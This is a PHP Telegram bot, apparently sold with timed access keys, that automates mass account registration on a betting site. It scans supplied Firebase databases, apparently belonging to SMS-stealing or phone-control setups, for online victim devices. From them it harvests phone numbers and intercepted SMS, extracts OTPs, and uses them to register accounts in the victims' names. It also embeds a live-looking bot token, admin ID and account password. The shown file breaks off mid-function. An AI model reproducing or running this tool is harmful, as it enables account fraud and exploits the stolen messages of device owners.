<?php
/**
 * Lotus365 Auto Register Bot (Fairplay Base) - Unlimited Firebase + Unlimited IDs + Custom Timed Keys + Key Delete
 */

define('BOT_TOKEN', '9035886939:AAFkLPdh5JlBxLhsj_fK10bqarrFulxqmUE');
define('API_BASE', 'https://api.telegram.org/bot' . BOT_TOKEN . '/');
define('WELCOME_IMAGE_URL', '');

// Yahan apni NUMERIC Telegram User ID daalein (sirf numbers, jaise 123456789)
define('ADMIN_ID', 8287613405);
define('LOG_CHAT', 0);
define('DATA_DIR', __DIR__ . '/data');

define('SITE_SEND_OTP', 'https://click11.hurry2.net/api/send-otp');
define('SITE_REGISTER', 'https://click11.hurry2.net/api/registration');
define('SITE_PASSWORD', 'Imran9719');
define('SITE_REFER_URL', 'https://www.lotus365.bio');

define('PAGE_SIZE', 100);
define('MAX_DEVICES_PER_RUN', 0); // 0 = UNLIMITED
define('BATCH_SIZE', 100);
define('FB_SCAN_CONCURRENCY', 25);
define('FB_MSG_LIMIT', 500);
define('PROGRESS_INTERVAL', 1.5);
define('JOIN_CACHE_TTL', 20);
define('WORKER_SECRET', 'wsec_' . hash('sha256', BOT_TOKEN . '|lotus365_v2'));

@mkdir(DATA_DIR, 0755, true);
ignore_user_abort(true);
set_time_limit(0);
@ini_set('memory_limit', '-1');

if (!defined('BOT_LIB_ONLY')) {
    header('Content-Type: application/json');
    echo '{"ok":true}';
    if (function_exists('fastcgi_finish_request')) fastcgi_finish_request();
    else { while (ob_get_level()) ob_end_flush(); flush(); }
}

function isAdmin($uid) {
    return (int)$uid > 0 && (int)$uid === (int)ADMIN_ID;
}

function loadJson($name, $default = []) {
    $p = DATA_DIR . '/' . $name;
    if (!file_exists($p)) return $default;
    $fp = @fopen($p, 'r'); if (!$fp) return $default;
    flock($fp, LOCK_SH); $d = stream_get_contents($fp);
    flock($fp, LOCK_UN); fclose($fp);
    $j = json_decode($d, true); return $j === null ? $default : $j;
}

function saveJson($name, $data) {
    $p = DATA_DIR . '/' . $name;
    $fp = @fopen($p, 'c+'); if (!$fp) return false;
    flock($fp, LOCK_EX); ftruncate($fp, 0); rewind($fp);
    fwrite($fp, json_encode($data, JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE));
    fflush($fp); flock($fp, LOCK_UN); fclose($fp); return true;
}

function tg($method, $params = []) {
    static $ch = null; if ($ch === null) $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => API_BASE . $method,
        CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($params),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_TIMEOUT => 15, CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    return json_decode(curl_exec($ch), true);
}

function ensureSideMenuCommands() {
    $flag_file = DATA_DIR . '/commands_set_fp_v1.flag';
    if (file_exists($flag_file)) return;
    $commands = [
        ['command' => 'start', 'description' => '🚀 Start Bot'],
        ['command' => 'key', 'description' => '🔑 Enter Access Key'],
    ];
    $res = tg('setMyCommands', ['commands' => $commands]);
    if (!empty($res['ok'])) {
        tg('setChatMenuButton', ['menu_button' => ['type' => 'commands']]);
        @file_put_contents($flag_file, date('Y-m-d H:i:s'));
    }
}

function utf16_len($s) {
    if (function_exists('mb_convert_encoding')) return (int)(strlen(mb_convert_encoding($s, 'UTF-16LE', 'UTF-8')) / 2);
    return strlen($s);
}

function math_font($t) {
    static $m = null;
    if ($m === null) {
        $m = [];
        for ($i = 0; $i < 26; $i++) {
            $cU = function_exists('mb_chr') ? mb_chr(0x1D63C + $i, 'UTF-8') : '';
            $cL = function_exists('mb_chr') ? mb_chr(0x1D656 + $i, 'UTF-8') : '';
            if ($cU !== '') $m[chr(65 + $i)] = $cU;
            if ($cL !== '') $m[chr(97 + $i)] = $cL;
        }
    }
    return strtr($t, $m);
}

function build_parts($parts, $bold = true, $uc = true, $bq = true) {
    $text = ''; $ents = []; $off = 0;
    foreach ($parts as $p) {
        $disp = (string)$p[0]; $etype = $p[2] ?? null;
        $isUrl = (bool)preg_match('#https?://#i', trim($disp));
        $isPhoneOnly = (bool)preg_match('#^[6-9]\d{9}$#', trim($disp));
        $skipStyle = $isUrl || $isPhoneOnly || $etype;
        if ($uc && !$skipStyle) $disp = mb_strtoupper($disp, 'UTF-8');
        if (!$skipStyle) $disp = math_font($disp);

        $len = utf16_len($disp);
        if ($etype) $ents[] = ['type'=>$etype,'offset'=>$off,'length'=>$len];
        elseif ($bold && $disp !== '') $ents[] = ['type'=>'bold','offset'=>$off,'length'=>$len];
        $text .= $disp; $off += $len;
    }
    if ($bq && $text !== '') $ents[] = ['type'=>'blockquote','offset'=>0,'length'=>utf16_len($text)];
    return [$text, $ents];
}

function send_premium($chat_id, $parts, $kb = null, $bq = true) {
    list($text, $ents) = build_parts($parts, true, true, $bq);
    $p = ['chat_id'=>$chat_id,'text'=>$text,'entities'=>$ents,'disable_web_page_preview'=>true];
    if ($kb) $p['reply_markup'] = $kb;
    return tg('sendMessage', $p);
}

function edit_premium($chat_id, $mid, $parts, $kb = null) {
    list($text, $ents) = build_parts($parts, true, true, true);
    $p = ['chat_id'=>$chat_id,'message_id'=>$mid,'text'=>$text,'entities'=>$ents,'disable_web_page_preview'=>true];
    if ($kb) $p['reply_markup'] = $kb;
    return tg('editMessageText', $p);
}

function sendDocument($chat_id, $filePath, $caption = '') {
    $ch = curl_init(API_BASE . 'sendDocument');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => [
            'chat_id' => $chat_id,
            'document' => new CURLFile($filePath, 'text/plain', basename($filePath)),
            'caption' => $caption, 'parse_mode' => 'HTML'
        ],
        CURLOPT_TIMEOUT => 60, CURLOPT_SSL_VERIFYPEER => false,
    ]);
    return json_decode(curl_exec($ch), true);
}

/* ================= KEY & DURATION SYSTEM ================= */

function parseDurationToSeconds($raw) {
    $s = strtolower(trim((string)$raw));
    if ($s === '' || in_array($s, ['unlimited', 'perm', 'permanent', 'life', 'lifetime', '0', 'inf'])) {
        return ['seconds' => null, 'label' => 'UNLIMITED'];
    }
    if (!preg_match('/^(\d+)\s*(m|min|mins|minute|minutes|h|hr|hrs|hour|hours|d|day|days|w|wk|wks|week|weeks)$/i', $s, $m)) {
        return null;
    }
    $val = (int)$m[1];
    if ($val <= 0) return null;
    $unit = strtolower($m[2][0]);
    if ($unit === 'm') return ['seconds' => $val * 60, 'label' => $val . ' MINUTE(S)'];
    if ($unit === 'h') return ['seconds' => $val * 3600, 'label' => $val . ' HOUR(S)'];
    if ($unit === 'd') return ['seconds' => $val * 86400, 'label' => $val . ' DAY(S)'];
    if ($unit === 'w') return ['seconds' => $val * 604800, 'label' => $val . ' WEEK(S)'];
    return null;
}

function formatRemainingTime($expiresAt) {
    if ($expiresAt === null) return 'UNLIMITED';
    $diff = (int)$expiresAt - time();
    if ($diff <= 0) return 'EXPIRED';
    $days = floor($diff / 86400);
    $hours = floor(($diff % 86400) / 3600);
    $mins = floor(($diff % 3600) / 60);
    $secs = $diff % 60;
    $parts = [];
    if ($days > 0) $parts[] = $days . 'd';
    if ($hours > 0) $parts[] = $hours . 'h';
    if ($mins > 0) $parts[] = $mins . 'm';
    if ($days === 0 && $hours === 0) $parts[] = $secs . 's';
    return implode(' ', $parts);
}

function getKeysDb() { return loadJson('keys.json', []); }
function saveKeysDb($db) { return saveJson('keys.json', $db); }

function createAccessKey($customKey, $durationRaw) {
    $parsed = parseDurationToSeconds($durationRaw);
    if ($parsed === null) return ['ok' => false, 'error' => 'INVALID DURATION (USE: 30m, 2h, 1d, 7d, 30d, OR UNLIMITED)'];

    $code = strtoupper(trim((string)$customKey));
    if ($code === '' || in_array($code, ['AUTO', 'RANDOM', 'GEN'])) {
        $code = 'LT-' . strtoupper(bin2hex(random_bytes(4)));
    } else {
        $code = preg_replace('/[^A-Z0-9_-]/', '', $code);
        if (strlen($code) < 3 || strlen($code) > 40) {
            return ['ok' => false, 'error' => 'KEY LENGTH MUST BE 3-40 CHARS (A-Z, 0-9, _, -)'];
        }
    }

    $db = getKeysDb();
    if (isset($db[$code])) {
        return ['ok' => false, 'error' => 'KEY ALREADY EXISTS: ' . $code];
    }

    $db[$code] = [
        'key' => $code,
        'duration_sec' => $parsed['seconds'],
        'duration_label' => $parsed['label'],
        'created_at' => time(),
        'activated_at' => null,
        'expires_at' => null,
        'assigned_to' => null,
        'active' => true,
    ];
    saveKeysDb($db);
    return ['ok' => true, 'entry' => $db[$code]];
}

function deleteAccessKey($code) {
    $code = strtoupper(trim((string)$code));
    $db = getKeysDb();
    if (!isset($db[$code])) return false;
    unset($db[$code]);
    saveKeysDb($db);
    return true;
}

function redeemAccessKey($uid, $code) {
    $code = strtoupper(trim((string)$code));
    $db = getKeysDb();
    if (!isset($db[$code])) {
        return ['ok' => false, 'msg' => 'INVALID KEY. CHECK AND TRY AGAIN.'];
    }
    $entry = $db[$code];
    if (empty($entry['active'])) {
        return ['ok' => false, 'msg' => 'THIS KEY IS INACTIVE / DELETED.'];
    }

    $now = time();
    if ($entry['expires_at'] !== null && $now >= (int)$entry['expires_at']) {
        unset($db[$code]);
        saveKeysDb($db);
        return ['ok' => false, 'msg' => 'THIS KEY HAS EXPIRED.'];
    }

    if ($entry['assigned_to'] !== null && (int)$entry['assigned_to'] !== (int)$uid) {
        return ['ok' => false, 'msg' => 'THIS KEY IS ALREADY USED BY ANOTHER USER.'];
    }

    if ($entry['activated_at'] === null) {
        $entry['activated_at'] = $now;
        $entry['assigned_to'] = (int)$uid;
        $entry['expires_at'] = ($entry['duration_sec'] !== null) ? ($now + (int)$entry['duration_sec']) : null;
        $db[$code] = $entry;
        saveKeysDb($db);
    }

    return ['ok' => true, 'entry' => $entry];
}

function getUserActiveKey($uid) {
    if (isAdmin($uid)) {
        return ['key' => 'ADMIN-ACCESS', 'duration_label' => 'UNLIMITED', 'expires_at' => null, 'remaining' => 'UNLIMITED'];
    }
    $db = getKeysDb();
    $now = time();
    $changed = false;
    $activeKey = null;

    foreach ($db as $code => $entry) {
        if ((int)($entry['assigned_to'] ?? 0) === (int)$uid) {
            if ($entry['expires_at'] !== null && $now >= (int)$entry['expires_at']) {
                unset($db[$code]);
                $changed = true;
            } elseif (!empty($entry['active'])) {
                $activeKey = $entry;
                $activeKey['remaining'] = formatRemainingTime($entry['expires_at']);
            }
        }
    }
    if ($changed) saveKeysDb($db);
    return $activeKey;
}

function hasValidKey($uid) {
    if (isAdmin($uid)) return true;
    return getUserActiveKey($uid) !== null;
}

/* ================= KEYBOARDS ================= */

function mainMenuKeyboard($uid = 0) {
    $rows = [
        [['text'=>math_font('CREATE ACCOUNT'),'style'=>'success']],
        [['text'=>math_font('AUTO MODE'),'style'=>'primary']],
        [['text'=>math_font('MY ACCOUNTS'),'style'=>'primary']],
        [['text'=>math_font('ENTER KEY'),'style'=>'primary'], ['text'=>math_font('CANCEL'),'style'=>'danger']],
    ];
    if (isAdmin($uid)) {
        $rows[] = [
            ['text'=>math_font('GEN KEY'),'style'=>'success'],
            ['text'=>math_font('LIST KEYS'),'style'=>'primary'],
            ['text'=>math_font('DEL KEY'),'style'=>'danger'],
        ];
    }
    return ['keyboard'=>$rows, 'resize_keyboard'=>true];
}

function cancelKeyboard() {
    return ['keyboard'=>[[['text'=>math_font('CANCEL'),'style'=>'danger']]],'resize_keyboard'=>true];
}

function forceJoinKeyboard($channels) {
    $rows = [];
    foreach ($channels as $i => $ch)
        $rows[] = [['text'=>math_font('JOIN CHANNEL'),'url'=>$ch['invite_url'],'style'=>($i%2===0?'danger':'primary')]];
    $rows[] = [['text'=>math_font('CHECK MEMBERSHIP'),'callback_data'=>'check_membership','style'=>'success']];
    return ['inline_keyboard'=>$rows];
}

function getSettings() { return loadJson('settings.json', ['channels'=>[],'maintenance'=>false]); }
function getUsers(){ return loadJson('users.json', []); }
function saveUsers($u){ return saveJson('users.json', $u); }
function getStates(){ return loadJson('states.json', []); }
function saveStates($s){ return saveJson('states.json', $s); }
function getVerified(){ return loadJson('verified.json', []); }
function saveVerified($v){ return saveJson('verified.json', $v); }
function getState($uid){ $s = getStates(); return $s[$uid] ?? null; }
function setState($uid, $s){ $a = getStates(); $a[$uid] = $s; saveStates($a); }
function clearState($uid){ $a = getStates(); unset($a[$uid]); saveStates($a); }

function setVerified($uid, $v = true){
    $a = getVerified();
    if ($v) $a[$uid] = time(); else unset($a[$uid]);
    saveVerified($a);
}

function ensureUser($uid, $name = '', $username = '') {
    $u = getUsers();
    if (!isset($u[$uid])) {
        $u[$uid] = ['id'=>$uid,'name'=>$name,'username'=>$username,'joined_at'=>date('Y-m-d H:i:s')];
        saveUsers($u);
    } else {
        $changed = false;
        if ($name !== '' && ($u[$uid]['name'] ?? '') !== $name) { $u[$uid]['name'] = $name; $changed = true; }
        if ($username !== '' && ($u[$uid]['username'] ?? '') !== $username) { $u[$uid]['username'] = $username; $changed = true; }
        if ($changed) saveUsers($u);
    }
}

function getUser($uid){ $u = getUsers(); return $u[$uid] ?? null; }
function accountsFile($uid) { return DATA_DIR . '/accounts_' . $uid . '.txt'; }

function saveAccount($uid, $phone, $userId) {
    $line = $phone . "\n";
    file_put_contents(accountsFile($uid), $line, FILE_APPEND | LOCK_EX);
}

function getAccountCount($uid) {
    $f = accountsFile($uid);
    if (!file_exists($f)) return 0;
    return count(array_filter(file($f)));
}

function isPhoneRegistered($uid, $phone) {
    $f = accountsFile($uid);
    if (!file_exists($f)) return false;
    foreach (file($f) as $line) {
        if (trim($line) === $phone) return true;
    }
    return false;
}

function checkForceJoin($uid, $force = false) {
    if (isAdmin($uid)) return true;
    $v = getVerified(); $last = isset($v[$uid]) ? (is_numeric($v[$uid]) ? (int)$v[$uid] : 0) : 0;
    if (!$force && $last > 0 && (time() - $last) < JOIN_CACHE_TTL) return true;
    $channels = getSettings()['channels'] ?? [];
    if (empty($channels)) { setVerified($uid, true); return true; }

    $mh = curl_multi_init(); $hs = [];
    foreach ($channels as $i => $ch) {
        $c = curl_init(API_BASE . 'getChatMember');
        curl_setopt_array($c, [
            CURLOPT_RETURNTRANSFER=>true, CURLOPT_POST=>true,
            CURLOPT_POSTFIELDS=>json_encode(['chat_id'=>$ch['chat_id'],'user_id'=>$uid]),
            CURLOPT_HTTPHEADER=>['Content-Type: application/json'],
            CURLOPT_TIMEOUT=>4, CURLOPT_SSL_VERIFYPEER=>false,
        ]);
        curl_multi_add_handle($mh, $c); $hs[$i] = $c;
    }
    $active = null;
    do { $mrc = curl_multi_exec($mh, $active); if ($active) curl_multi_select($mh, 0.1); } while ($active && $mrc == CURLM_OK);
    $ok = true;
    foreach ($hs as $c) {
        $res = json_decode((string)curl_multi_getcontent($c), true);
        curl_multi_remove_handle($mh, $c); curl_close($c);
        $st = $res['result']['status'] ?? '';
        if (empty($res['ok']) || !in_array($st, ['member','administrator','creator'])) $ok = false;
    }
    curl_multi_close($mh); setVerified($uid, $ok); return $ok;
}

function sendJoinPrompt($chat_id) {
    $channels = getSettings()['channels'] ?? [];
    send_premium($chat_id, [
        ['❌', null], [" CHANNEL MEMBERSHIP REQUIRED!\n\n", null],
        ['📢', null], [" PEHLE CHANNEL JOIN KAREIN, PHIR CHECK PAR CLICK KAREIN.", null],
    ], forceJoinKeyboard($channels));
}

function sendKeyRequiredPrompt($chat_id, $uid) {
    send_premium($chat_id, [
        ['🔐', null], [" ACCESS KEY REQUIRED!\n\n", null],
        [" IS BOT KO USE KARNE KE LIYE VALID KEY CHAHIYE.\n", null],
        [" KEY DALNE KE LIYE 'ENTER KEY' BUTTON DABAYEIN YA /key BHEJEIN.", null],
    ], mainMenuKeyboard($uid));
}

function extractLotusOtp($body) {
    if (preg_match('/Your OTP is (\d{4,6})/i', $body, $m)) return $m[1];
    if (preg_match('/OTP[:\s]+(\d{4,6})/i', $body, $m)) return $m[1];
    if (preg_match('/\b(\d{4,6})\b.*(?:OTP|code|verify)/i', $body, $m)) return $m[1];
    if (preg_match('/(?:OTP|code|verify).*?\b(\d{4,6})\b/i', $body, $m)) return $m[1];
    return null;
}

function extractPhoneFromMsgs($msgs) {
    if (!is_array($msgs)) return null;
    $counts = [];
    foreach ($msgs as $msg) {
        if (!is_array($msg)) continue;
        $text = (string)($msg['body'] ?? $msg['message'] ?? $msg['text'] ?? '');
        if ($text === '') continue;
        if (preg_match_all('/\b(?:\+91|91|0)?([6-9]\d{9})\b/', $text, $m)) {
            foreach ($m[1] as $p) $counts[$p] = ($counts[$p] ?? 0) + 1;
        }
    }
    if (empty($counts)) return null;
    arsort($counts);
    return (string)array_key_first($counts);
}

function cleanPhone($raw) {
    $d = preg_replace('/\D/', '', (string)$raw);
    if (strlen($d) == 12 && substr($d, 0, 2) == '91') $d = substr($d, 2);
    elseif (strlen($d) == 11 && substr($d, 0, 1) == '0') $d = substr($d, 1);
    if (strlen($d) > 10) $d = substr($d, -10);
    if (strlen($d) == 10 && in_array($d[0], ['6','7','8','9'])) return $d;
    return null;
}

function buildSendOtpHandle($phone) {
    $ch = curl_init(SITE_SEND_OTP);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode(['type' => 'registration','mobile' => $phone,'countrycode' => '91']),
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json', 'Accept: application/json, text/plain, */*',
            'Authorization: Bearer null', 'User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A5560) AppleWebKit/537.36',
            'Origin: ' . SITE_REFER_URL, 'Referer: ' . SITE_REFER_URL . '/',
        ],
        CURLOPT_TIMEOUT => 10, CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_SSL_VERIFYPEER => false,
    ]);
    return $ch;
}

function buildRegisterHandle($phone, $otp) {
    $ch = curl_init(SITE_REGISTER);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode([
            'userid' => '', 'mobile' => $phone, 'password' => SITE_PASSWORD,
            'otp' => (int)$otp, 'isDownLine' => false, 'refer_code' => null, 'country_code' => '91', 'affiliate_code' => null,
        ]),
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json', 'Accept: application/json, text/plain, */*',
            'Authorization: Bearer null', 'User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A5560) AppleWebKit/537.36',
            'Origin: ' . SITE_REFER_URL, 'Referer: ' . SITE_REFER_URL . '/',
        ],
        CURLOPT_TIMEOUT => 10, CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_SSL_VERIFYPEER => false,
    ]);
    return $ch;
}

function normalizeFirebase($url) {
    if (!$url) return null;
    $u = trim((string)$url, " \t\n\r\0\x0B\"',;[]()");
    if ($u === '') return null;
    if (!preg_match('#^https?://#i', $u)) {
        if (strpos($u, 'firebaseio.com') !== false || strpos($u, 'firebasedatabase.app') !== false) {
            $u = 'https://' . $u;
        } else {
            return null;
        }
    }
    if (strpos($u, 'firebaseio.com') === false && strpos($u, 'firebasedatabase.app') === false) return null;
    $u = rtrim($u, '/');
    while (substr($u, -5) === '.json') $u = rtrim(substr($u, 0, -5), '/');
    return $u;
}

function extractFirebaseUrlsFromText($text) {
    $text = (string)$text;
    if ($text === '') return [];
    $found = [];
    if (preg_match_all('#https?://[^\s"\'<>\]\)]+#i', $text, $m)) {
        foreach ($m[0] as $rawUrl) {
            $norm = normalizeFirebase($rawUrl);
            if ($norm) $found[$norm] = true;
        }
    }
    foreach (preg_split('/[\s,;]+/', $text) as $tok) {
        $norm = normalizeFirebase($tok);
        if ($norm) $found[$norm] = true;
    }
    return array_keys($found);
}

function extractFirebaseUrlsFromFile($fileId) {
    $info = tg('getFile', ['file_id' => $fileId]);
    $filePath = $info['result']['file_path'] ?? '';
    if ($filePath === '') return null;

    $dlUrl = 'https://api.telegram.org/file/bot' . BOT_TOKEN . '/' . ltrim($filePath, '/');
    $ch = curl_init($dlUrl);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 8,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $content = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($code != 200 || $content === false || $content === '') return null;
    return extractFirebaseUrlsFromText($content);
}

function fbGet($url, $timeout = 6) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>$timeout, CURLOPT_CONNECTTIMEOUT=>3, CURLOPT_ENCODING=>'', CURLOPT_SSL_VERIFYPEER=>false]);
    $r = curl_exec($ch); $code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);
    if ($code != 200 || !$r || $r === 'null') return null;
    return json_decode($r, true);
}

function multiGetJson($urls, $timeout = 6, $batchSize = BATCH_SIZE) {
    if (empty($urls)) return [];
    $out = [];
    $bs = max(1, (int)$batchSize);
    foreach (array_chunk($urls, $bs, true) as $chunk) {
        $mh = curl_multi_init(); $hs = [];
        foreach ($chunk as $k => $u) {
            $c = curl_init($u);
            curl_setopt_array($c, [CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>$timeout, CURLOPT_CONNECTTIMEOUT=>2, CURLOPT_ENCODING=>'', CURLOPT_SSL_VERIFYPEER=>false]);
            curl_multi_add_handle($mh, $c); $hs[$k] = $c;
        }
        $active = null;
        do { $mrc = curl_multi_exec($mh, $active); if ($active) curl_multi_select($mh, 0.1); } while ($active && $mrc == CURLM_OK);
        foreach ($hs as $k => $c) {
            $code = curl_getinfo($c, CURLINFO_HTTP_CODE); $b = curl_multi_getcontent($c);
            $out[$k] = ($code==200 && $b && $b !== 'null') ? json_decode($b, true) : null;
            curl_multi_remove_handle($mh, $c); curl_close($c);
        }
        curl_multi_close($mh);
    }
    return $out;
}

function parseDevicesFromNodeData($data) {
    $res = ['ok' => false, 'total' => 0, 'online' => 0, 'onlineDevices' => []];
    if (!is_array($data)) return $res;
    $res['ok'] = true;
    $res['total'] = count($data);
    foreach ($data as $cid => $info) {
        if (!is_array($info)) continue;
        $st = $info['status'] ?? null;
        if (!($st === true || in_array(strtolower((string)$st), ['true','1','online','active','on']))) continue;
        $res['online']++;
        $phone = null;
        foreach (['mobNo','mob_no','mobile','phoneNumber','phone'] as $f) {
            $phone = cleanPhone($info[$f] ?? '');
            if ($phone) break;
        }
        $res['onlineDevices'][(string)$cid] = ['phone'=>$phone, 'name'=>$info['modelName'] ?? $info['model'] ?? $cid];
    }
    return $res;
}

function fetchFirebaseDevices($baseUrl, $fast = false) {
    $base = rtrim($baseUrl, '/');
    $out = ['ok'=>false, 'total'=>0, 'online'=>0, 'devices'=>[]];
    $onlineDevices = [];
    $t = $fast ? 2 : 7;

    foreach (['clients','devices'] as $node) {
        $data = fbGet($base . '/' . $node . '.json', $t);
        if (is_array($data)) {
            $parsed = parseDevicesFromNodeData($data);
            $out['ok'] = $parsed['ok'];
            $out['total'] = $parsed['total'];
            $out['online'] = $parsed['online'];
            $onlineDevices = $parsed['onlineDevices'];
            if (!empty($onlineDevices)) break;
        }
    }
    if (empty($onlineDevices) && !$fast) {
        foreach (['All_Users','All_User'] as $root) {
            $devInfo = fbGet($base . '/' . $root . '/DeviceInfo.json', $t);
            if (!is_array($devInfo)) $devInfo = fbGet($base . '/' . $root . '/Data/DeviceInfo.json', $t);
            if (!is_array($devInfo)) continue;
            $out['ok'] = true; $out['total'] = count($devInfo);
            $sim = fbGet($base . '/' . $root . '/simDetails.json', $t);
            foreach ($devInfo as $devId => $info) {
                if (!is_array($info)) continue;
                $st = strtolower((string)($info['Status'] ?? $info['status'] ?? ''));
                if (!in_array($st, ['online','on','active','1','true'])) continue;
                $out['online']++;
                $s = $sim[$devId] ?? [];
                $phone = null;
                foreach (['sim1Number','sim2Number','phoneNumber','number','phone','mobile','mobNo'] as $f) {
                    $phone = cleanPhone($s[$f] ?? $info[$f] ?? '');
                    if ($phone) break;
                }
                $onlineDevices[(string)$devId] = ['phone'=>$phone, 'name'=>$info['ModelName'] ?? $devId];
            }
            if (!empty($onlineDevices)) break;
        }
    }
    $missingPhoneUrls = [];
    foreach ($onlineDevices as $cid => $d) {
        if (empty($d['phone'])) {
            $missingPhoneUrls[$cid] = $base . '/messages/' . rawurlencode($cid) . '.json?orderBy=%22$key%22&limitToLast=' . FB_MSG_LIMIT;
        }
    }
    if (!empty($missingPhoneUrls)) {
        $fetchedMsgs = multiGetJson($missingPhoneUrls, $t);
        foreach ($fetchedMsgs as $cid => $msgs) {
            if (is_array($msgs)) {
                $ext = extractPhoneFromMsgs($msgs);
                if ($ext) $onlineDevices[$cid]['phone'] = $ext;
            }
        }
    }
    foreach ($onlineDevices as $cid => $d) {
        if (!empty($d['phone'])) $out['devices'][$cid] = ['phone'=>$d['phone'], 'name'=>$d['name']];
    }
    return $out;
}

function fastBatchScanFirebases($urls, $timeout = 2, $concurrency = FB_SCAN_CONCURRENCY) {
    $results = [];
    if (empty($urls)) return $results;

    $clientUrls = [];
    foreach ($urls as $idx => $u) $clientUrls[$idx] = rtrim($u, '/') . '/clients.json';
    $clientsRes = multiGetJson($clientUrls, $timeout, $concurrency);

    $needDevicesUrls = [];
    foreach ($urls as $idx => $u) {
        $parsed = parseDevicesFromNodeData($clientsRes[$idx] ?? null);
        if (!empty($parsed['onlineDevices'])) {
            $results[$idx] = ['ok'=>true, 'onlineDevices'=>$parsed['onlineDevices']];
        } else {
            $needDevicesUrls[$idx] = rtrim($u, '/') . '/devices.json';
        }
    }

    if (!empty($needDevicesUrls)) {
        $devicesRes = multiGetJson($needDevicesUrls, $timeout, $concurrency);
        foreach ($needDevicesUrls as $idx => $du) {
            $parsed = parseDevicesFromNodeData($devicesRes[$idx] ?? null);
            $results[$idx] = [
                'ok' => $parsed['ok'] || !empty($clientsRes[$idx]),
                'onlineDevices' => $parsed['onlineDevices']
            ];
        }
    }

    $missingPhoneMap = [];
    foreach ($results as $idx => $r) {
        if (empty($r['onlineDevices'])) continue;
        $base = rtrim($urls[$idx], '/');
        foreach ($r['onlineDevices'] as $cid => $d) {
            if (empty($d['phone'])) {
                $missingPhoneMap[$idx . ':::' . $cid] = $base . '/messages/' . rawurlencode($cid) . '.json?orderBy=%22$key%22&limitToLast=' . FB_MSG_LIMIT;
            }
        }
    }

    if (!empty($missingPhoneMap)) {
        $msgsBatch = multiGetJson($missingPhoneMap, $timeout, BATCH_SIZE);
        foreach ($msgsBatch as $compositeKey => $msgs) {
            if (!is_array($msgs)) continue;
            [$idxStr, $cid] = explode(':::', $compositeKey, 2);
            $idx = (int)$idxStr;
            $ext = extractPhoneFromMsgs($msgs);
            if ($ext && isset($results[$idx]['onlineDevices'][$cid])) {
                $results[$idx]['onlineDevices'][$cid]['phone'] = $ext;
            }
        }
    }

    $final = [];
    foreach ($urls as $idx => $u) {
        $devs = [];
        foreach ($results[$idx]['onlineDevices'] ?? [] as $cid => $d) {
            if (!empty($d['phone'])) {
                $devs[$cid] = ['phone' => $d['phone'], 'name' => $d['name']];
            }
        }
        $final[$idx] = [
            'ok' => !empty($results[$idx]['ok']),
            'devices' => $devs
        ];
    }
    return $final;
}

function computePages($total) {
    $pages = [];
    for ($i=0; $i<$total; $i+=PAGE_SIZE) $pages[] = [$i, min($i+PAGE_SIZE, $total)];
    return empty($pages) ? [[0,0]] : $pages;
}

function getTerminalState($uid) { return loadJson('terminal_' . $uid . '.json', null); }
function setTerminalState($uid, $s) { saveJson('terminal_' . $uid . '.json', $s); }
function getUserManualPage($uid) { return loadJson('userpage_' . $uid . '.json', ['page'=>0,'set_at'=>0]); }
function setUserManualPage($uid, $pg) { saveJson('userpage_' . $uid . '.json', ['page'=>(int)$pg,'set_at'=>time()]); }
function clearUserManualPage($uid) { @unlink(DATA_DIR . '/userpage_' . $uid . '.json'); }

function pickDisplayPage($state, $uid) {
    $total = $state['total'] ?? 0;
    $totalPages = count(computePages($total));
    if ($totalPages <= 1) return 0;
    $up = getUserManualPage($uid);
    if (!empty($up['set_at'])) return max(0, min($totalPages-1, (int)$up['page']));
    return max(0, min($totalPages-1, (int)($state['current_page'] ?? 0)));
}

function terminalParts($state, $pageIdx, $final = false) {
    $parts = [];
    $devices = $state['devices'] ?? [];
    $total = $state['total'] ?? 0; $done = $state['done'] ?? 0;
    $success = $state['success'] ?? 0; $failed = $state['failed'] ?? 0;
    $cancelled = !empty($state['cancelled']);
    $pages = computePages($total); $totalPages = count($pages);
    $pageIdx = max(0, min($totalPages-1, $pageIdx));
    [$start, $end] = $pages[$pageIdx];
    $pNum = $pageIdx + 1;

    $startedAt = $state['started_at'] ?? time();
    $elapsed = max(0, time() - $startedAt);
    $timerStr = sprintf('%02d:%02d', floor($elapsed / 60), $elapsed % 60);

    $parts[] = ['🤖', null];
    $parts[] = [" LOTUS365 AUTO REGISTER [⏱ $timerStr] — PAGE $pNum/$totalPages\n", null];
    $parts[] = ["━━━━━━━━━━━━━━━━━━\n", null];
    $parts[] = ['📊', null];  $parts[] = [" TOTAL: $total/UNLIMITED | ", null];
    $parts[] = ['✅', null]; $parts[] = [" SUCCESS: $success | ", null];
    $parts[] = ['❌', null];  $parts[] = [" FAILED: $failed\n\n", null];

    for ($i=$start; $i<$end; $i++) {
        $d = $devices[$i] ?? null; if (!$d) continue;
        $phone = $d['phone'] ?? 'N/A'; $st = $d['status'] ?? 'pending';
        $parts[] = ['⭐', null];
        $parts[] = [" $phone ", null];

        if ($st === 'completed') {
